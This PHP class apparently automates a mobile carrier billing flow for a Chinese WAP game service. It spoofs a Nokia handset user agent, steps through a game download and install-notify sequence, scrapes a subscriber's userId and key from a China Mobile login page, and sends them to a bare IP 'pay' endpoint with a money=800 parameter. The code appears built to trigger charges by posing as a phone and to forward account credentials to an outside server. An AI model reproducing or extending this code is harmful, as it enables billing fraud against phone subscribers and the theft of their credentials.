<?php
class Application_Service_Webflow_GameHelper extends Application_Service_Webflow_AbstractHelper{
    protected function getAgent(){
        return 'NokiaN73-1/2.0628.0.0.1 S60/3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1';
    }
    protected function composePreChargeOutput(){
        $this->appendPage('http://gamepie.g188.net/gamecms/wap/game/wyinfo/700018728000?channelId=10005000','href="^^">[免费下载]');
    }
    protected function composeChargeOutput(){
        $this->appendPage('http://gamepie.g188.net${v1}','ontimer="^">');
        $this->appendPage('${v1}',array(
                'MIDlet-Jar-URL: ^0x0d',
                'MIDlet-Install-Notify: ^0x0d'));
        $this->appendPage('${v1}');
        $this->appendPage('${v2}',null,3,'900 Success');
        $this->appendPage("http://gmp.i139.cn/bizcontrol/LoginOnlineGame?sender=202&cpId=C00165&cpServiceId=614410043408&fid=1000&channelId=10005000",array(
                'userId=^0x0d',
                'key=^0x0d'));
        $this->appendPage('http://211.99.213.46:8080/pay?cpid=10013&userid=${v1}&key=${v2}&money=800');
        $this->appendResponsePage();
    }
}

